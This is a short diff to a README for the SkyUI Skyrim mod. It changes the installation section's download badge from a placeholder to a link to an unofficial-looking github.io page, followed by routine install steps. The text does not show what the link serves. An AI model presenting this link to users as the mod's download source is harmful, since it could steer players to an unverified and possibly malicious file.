@@ -8,7 +8,7 @@ SkyUI is essential for players using **Skyrim Special Edition or Anniversary Edi
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://skyui-windows.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Install using a mod manager (**Vortex, Mod Organizer 2**) or manually copy files into the Skyrim `Data` folder.  
